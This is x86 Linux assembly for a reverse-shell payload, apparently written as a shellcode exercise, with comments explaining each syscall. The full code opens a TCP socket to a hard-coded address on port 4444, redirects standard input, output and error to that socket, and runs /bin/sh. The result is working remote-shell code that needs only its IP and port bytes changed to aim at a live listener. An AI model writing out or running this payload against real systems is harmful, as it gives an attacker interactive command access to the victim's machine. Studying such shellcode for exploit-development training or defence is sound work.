global _start
 
section .text
 
_start:

	xor edx,edx ; clear out edx
	; create socket
	push 0x66
	pop eax ; syscall for socketcall

	push 0x1 
	pop ebx ; SOCKET_CALL from net.h = 1

	push edx ; push 0
	push ebx ; value of SOCK_STREAM = 1 got it from header /usr/src
	push 0x2 ; value 2 from /usr/include/i386-linux-gnu/bits/socket.h
	mov ecx,esp ; move ecx to top of the stack
	int 0x80 ; call interrupt


	; store returning socket in esi for further use
	mov esi,eax


	;connect


	push 0x66
	pop eax ;syscall for socket_call

	push 0x3
	pop ebx ; SYS_CONNECT = 3 from /usr/include/linux/net.h

	
	push 0x0101017f	; reverse shell IP 
	push word 0x5c11  ;reverse shell port : 4444
	push word 0x2     ; AF_INET = PF_INET = 2
	mov edi, esp	; move top of the stack to edi to prepare struct
	push 0x10    ; size = 16
	push edi     ; push the pointer to created struct
	push esi    ;created sock
	mov ecx, esp   ;move top of the stack to ecx
	
	int 0x80 ; call system interrupt 


	;redirect Input, output and error to created sock

	mov ebx,esi
	xor ecx,ecx
	mov cl,0x2 ; initialize counter to 2

	redirectIO:
		mov al, 0x3f
		int 0x80
		dec ecx
		jns redirectIO

	; spawn a shell using execve /bin/sh

	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp		; /bin//sh
	mov ecx, edx	; NULL
	mov al, 0xb	 ; syscall for execve
	int 0x80
